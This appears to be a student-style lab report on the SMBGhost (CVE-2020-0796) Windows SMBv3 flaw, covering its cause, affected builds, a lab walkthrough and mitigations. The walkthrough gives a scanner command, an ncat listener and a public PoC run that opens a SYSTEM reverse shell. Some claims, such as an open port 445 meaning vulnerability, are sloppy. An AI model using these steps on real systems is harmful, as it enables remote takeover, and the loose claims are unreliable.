
# CVE-2020-0796: Microsoft SMBv3 Remote Code Execution Vulnerability

## Introduction

This report examines CVE-2020-0796, a critical vulnerability impacting the Server Message Block (SMB) protocol in Windows 10 (2020). Commonly known as SMBGhost, SMBleedingGhost, and CoronaBlue, this vulnerability poses a significant threat.

The report offers a comprehensive technical analysis of CVE-2020-0796, detailing its inner workings. It also explores real-world instances of the vulnerability, identifying affected systems "in the wild." Finally, to solidify the findings, the report includes the design and setup for a proof-of-concept exploit demonstrating the vulnerability's practical exploitation.

## Description of Vulnerability

The Microsoft Server Message Block (SMBv3) protocol, specifically versions 3.1.1 and later, has a critical remote code execution (RCE) vulnerability identified as CVE-2020-0796. This vulnerability exists due to how SMBv3 handles certain requests.

An attacker can exploit this vulnerability to potentially gain access to a target server or client and execute code. The vulnerability primarily affects Windows 10 machines, particularly versions 1903 and 1909, but any system using SMBv3.1.1 could be susceptible. Exploitation hinges on the SMB compression feature, which can lead to a buffer overflow vulnerability. Due to its wormable nature, the exploit has the potential to propagate rapidly across networks. Microsoft publicly disclosed this vulnerability on March 12, 2020.

Server Message Block (SMB) is a communication protocol developed by Microsoft specifically for network file and resource sharing. It primarily leverages TCP/IP for resource transport, forming the foundation of Microsoft's shared file system. Since Windows 2000, SMB communication occurs over TCP port 445, facilitating communication with other systems on a network. Initially, communication between machines on the same network utilized port 139. The core operation of SMB involves the exchange of request-response messages between clients and servers.

In the case of CVE-2020-0796, attackers can embed a malicious payload within a compressed SMB connection. When the client or server attempts to decompress the packets, the data is written to a memory buffer without proper bounds checking. This unchecked data write triggers a buffer overflow attack, granting the attacker's code access to the system with potential system-level privileges.

## Affected windows versions

* Windows 10 Version 1903 for 32-bit Systems
* Windows 10 Version 1903 for ARM64-based Systems 
* Windows 10 Version 1903 for x64-based Systems 
* Windows 10 Version 19043 for x64-based Systems 
* Windows 10 Version 1909 for 32-bit Systems 
* Windows 10 Version 1909 for ARM64-based Systems 
* Windows 10 Version 1909 for x64-based Systems
* Windows Server, version 1903 (Server Core installation) 
* Windows Server, version 1909 (Server Core installation)

## The existence of the vulnerability in the wild

A significant number of Windows systems remained vulnerable to the CVE-2020-0796 (SMBGhost) exploit in March 2020, according to security reports. This highlights the ongoing importance of applying security patches promptly.

The specific number of vulnerable systems is not mentioned, but it emphasizes the widespread nature of the issue

![Image_link](https://github.com/Cyberopss/Windows-CVE/blob/main/CVE-2020-0796/images/1.png)

Windows 10 Home 19043 ranks top amongst all operating systems affected by this vulnerability, followed by Windows 10 pro 19043

![Image_link](https://github.com/Cyberopss/Windows-CVE/blob/main/CVE-2020-0796/images/2.png)

## Exploiting the vulnerability (setup environment and how it works)

### Test Environment
Here we are using VirtualBox to create the test environment. Kali Linux and Windows is used as the attacker machine and Windows 10 Home, version 1903, is used as the target machine for this vulnerability exploitation project

![2](https://github.com/Cyberopss/Windows-CVE/blob/main/CVE-2020-0796/images/3.png)

![2](https://github.com/Cyberopss/Windows-CVE/blob/main/CVE-2020-0796/images/4.png)

### Require tools and operating system

* ncat
* Oracle VM Virtual Box
* Attacker machine: any Windows 10 version, Kali Linux
* Target machine: Windows 10 19H1 (Build 18362.356-2019.09) English x64 version
* Stable internet access
* Python
* Text editor (Notepad, Visual Studio Code, IDLE for Python etc.)

### Setting up Attacker and Target Machine

The target system under scrutiny was a Windows 10 machine running server version 1903.

Attacker's IP Address: 192.168.18.135

Victim Machine's IP Address: 192.168.18.131

![2](https://github.com/Cyberopss/Windows-CVE/blob/main/CVE-2020-0796/images/5.png)

![2](https://github.com/Cyberopss/Windows-CVE/blob/main/CVE-2020-0796/images/6.png)

### Attacker Machine (Windows VM)

* The network setting is set to Bridged Adapter mode.
* Clone the vulnerability Scanner scripts and POC

### Attacker Machine (Kali VM)

* The network setting is set to Bridged Adapter mode
* Ncat (One way of installing ncat is to install wireshark and it will automatically install ncat in windows) 

### VictimMachine (Windows VM)
* The network setting is set to Bridged Adapter mode.
* Clone the POC script to Victim machine for calculating offset

### Checking Whether target is vulnerable or not

We ran nmap on target IP, which shows that the port 445 connecting to Microsoft-ds is open. Which means this target is vulnerable to SMBv3 Remote Code Execution attacks. 

Second approach is to run python scanner script. Python version 3 is used and the command 
``` python

python3 cve-2020-0796-scanner.py <Victim  IP>
```

is entered into the terminal opened from the scanner file created. On executing this command will show the result as ‘Vulnerable’ or 'not vulnerable'

![2](https://github.com/Cyberopss/Windows-CVE/blob/main/CVE-2020-0796/images/7.png)



### Adjust offset in SMBleedingGhost.py file

The target machine's offset must be calculated. First, we must know which Windows version is running on the target machine. In our virtual machine, we can easily create one  same version of Windows and use the calc target offsets.bat file to calculate the offset. Then, using any text editor, adjust the offset value in the SMBleedingGhost.py file as needed. For this POC to function, both offsets need to match. So change the offset according to victim machine

![2](https://github.com/Cyberopss/Windows-CVE/blob/main/CVE-2020-0796/images/9.png)

![2](https://github.com/Cyberopss/Windows-CVE/blob/main/CVE-2020-0796/images/10.png)

### Exploitation

With everything prepared, run command 
```
ncat -lvp 4443 
```
on attacker Kali machines to listen to a port. Then open another command prompt and run the code with command 
```
python3 SMBleedingGhost.py <Victim ip> <attacker ip> <port>
```
on the attacker machine.
ncat will display a shell that provides system access to the target computer after the python code is executed.
Port 4443 from the attacker machine will receive a connection from target machine. Microsoft Windows

![2](https://github.com/Cyberopss/Windows-CVE/blob/main/CVE-2020-0796/images/11.png)

![2](https://github.com/Cyberopss/Windows-CVE/blob/main/CVE-2020-0796/images/12.png)

### Expected outcome

If all goes well, we will be able to access the target as a localSystem account, the most powerful account on a Windows local instance. (Reverse shell with system access)

![2](https://github.com/Cyberopss/Windows-CVE/blob/main/CVE-2020-0796/images/13.png)


## Mitigation Techniques
* Disable SMBv3 Compression

you can disable the SMBv3 compression by the PowerShell command below:
```
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" DisableCompression -Type DWORD -Value 1 -Force

```
* Block inbound and outbound SMB

Consider blocking outbound SMB connections (TCP port 445 for SMBv3) from the local network to the WAN. Also ensure that SMB connections from the internet are not allowed to connect inbound to an enterprise LAN 

# Note

POC is taken from the following github repo [POC](https://github.com/jamf/CVE-2020-0796-RCE-POC) 

Snanner script is taken from following github repo [Scanner](https://github.com/ButrintKomoni/cve-2020-0796) 
